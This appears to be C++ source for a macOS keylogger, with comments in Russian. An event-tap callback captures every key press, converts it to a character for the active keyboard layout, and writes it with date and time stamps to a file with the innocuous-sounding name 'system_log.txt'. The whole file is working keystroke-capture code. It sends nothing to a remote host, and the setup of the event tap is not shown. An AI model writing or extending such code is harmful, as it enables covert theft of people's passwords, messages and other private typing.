#include "event_listener.h"

using namespace std;

wchar_t keyCodeToChar(int keyCode) {
    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
    CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
    const UCKeyboardLayout *keyboardLayout = reinterpret_cast<const UCKeyboardLayout *>(CFDataGetBytePtr(layoutData));

    UInt32 deadKeyState = 0;
    UniCharCount maxStringLength = 255;
    UniCharCount actualStringLength = 0;
    UniChar unicodeString[maxStringLength];

    OSStatus status = UCKeyTranslate(
        keyboardLayout,
        keyCode,
        kUCKeyActionDown,
        0,
        LMGetKbdType(),
        kUCKeyTranslateNoDeadKeysBit,
        &deadKeyState,
        maxStringLength,
        &actualStringLength,
        unicodeString
    );

    if (status != noErr) {
        cerr << "Ошибка при преобразовании кода клавиши в символ." << endl;
        return L'\0';
    }

    wchar_t result = unicodeString[0];

    CFRelease(currentKeyboard);

    return result;
}


// Функция-обработчик событий
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    // Проверяем, что это событие нажатия клавиши
    if (type == kCGEventKeyDown) {
        // Получаем код нажатой клавиши
        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        // Преобразуем код клавиши в символ
        wchar_t keyChar = keyCodeToChar(keyCode);

        ////////////////////////////////
        /// Рабочее решение с локалью и выводом в консоль
        // locale utf8_locale("ru_RU.UTF-8");
        // wcout.imbue(utf8_locale);
        // wcout << L"keyChar___" << keyChar << endl;
        //////////////////////////////

        string date_format = "%d-%m-%Y";
        string time_format = "%H:%M:%S";
        string date_time = getTimeStamp(date_format.c_str());
        string time_stamp = getTimeStamp(time_format.c_str());
        // wstring new_string_time = wstring(time_stamp.begin(), time_stamp.end());
        // wstring new_date_time = wstring(date_time.begin(), date_time.end());

        // TODO: change !!!
        string file_name = "system_log.txt";
        // string file_name = date_time + "_system_log.txt";
        wstring key_string = L"=KEY=" + wstring(1, keyChar);
        string info_string = "=DATE=" + date_time + "=TIME=" + time_stamp;
        WriteToOutputFile(key_string, info_string, file_name);
    }

    return event;
}
